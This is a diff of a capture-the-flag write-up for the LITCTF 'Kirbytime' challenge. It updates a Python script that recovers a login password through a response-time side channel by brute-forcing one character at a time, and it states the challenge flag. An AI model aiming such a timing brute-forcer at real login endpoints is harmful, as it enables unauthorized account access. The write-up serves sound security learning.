@@ -1,7 +1,7 @@
 ---
 title: Kirbytime
 date : 2024-08-13 10:00:00 +0530
-categories: [litctf , ctf]
+categories: [litctf]
 tags: [litctf, ctf]
 description: kirbytime
 ---
@@ -33,6 +33,8 @@ def login():
     return render_template('login.html', message=message)
 ```
 
+![kirby1](/assets/posts/LITCTF/kirby1.png)
+
 ## Analysis
 
 The website is a simple login page. We have to enter the correct password to get the flag. The password is the flag.
@@ -59,10 +61,10 @@ url = "<url>"
 def brute_password():
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
     password = "aaaaaaa" #kBySlaY
-    i = 0
-    j = 0
+    i,j,p = 0,0,0
     while True:
         while j < len(chars):
+            # see the delay. 
             starttime = time.time()
             response = requests.post(url, data={"password": password}).text
             endtime = time.time()
@@ -70,23 +72,26 @@ def brute_password():
             if "yayy! hi kirby" in response:
                 return password
             delay = endtime - starttime
-            p = i
-            i = int(delay)
+
+            i = int(delay) #flooring the delay. ( note if your internet is slow/ you are far away from server u might need to subtract some value from delay, I had a avg of 0.5s response time)
             if i > p:
+                p = i #previous correct character count
                 j = 0
-            print(delay)
             password = password[:i] + chars[j] + password[i+1:]
-            print(password)
             j+=1
 
 password = brute_password()
-print(f"Password found: {password}")
+print(f"Password found: {password}") #kBySlaY
 ```
 
 Now this script does take some time ~30-40 minutes to get the flag. I tried to use conconcurrency but the server was not responding well to concurrent requests as it did on my local instance. So I had to go with a single request at a time approach.
+
+Tested the password we got once and submitted the flag.
+
+![kirby2](/assets/posts/LITCTF/kirby2.png)
 
 > `Flag: LITCTF{kBySlaY}`
 
 ---
 
-[back to index](/posts/LIT-Index/)
+[back to index](https://p-pratik.github.io/posts/LIT-Index/)
